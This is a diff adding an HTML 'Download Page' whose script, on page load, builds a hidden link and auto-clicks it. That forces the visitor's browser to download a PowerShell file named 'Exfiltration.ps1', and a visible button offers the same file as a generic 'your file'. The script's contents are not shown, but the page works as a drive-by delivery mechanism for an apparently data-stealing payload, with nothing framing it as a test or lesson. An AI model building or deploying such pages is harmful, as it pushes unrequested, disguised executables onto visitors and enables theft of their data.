@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            margin: 0 auto;
+            max-width: 600px;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Automatically trigger the download
+            const link = document.createElement('a');
+            link.href = 'Exfiltration.ps1'; // Replace with the path to your executable file
+            link.download = 'Exfiltration.ps1';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Download Your File</h1>
+        <p>The download should start automatically. If not, click the button below to download your file.</p>
+        <a class="button" href="Exfiltration.ps1" download>Download File</a>
+    </div>
+</body>
+</html>
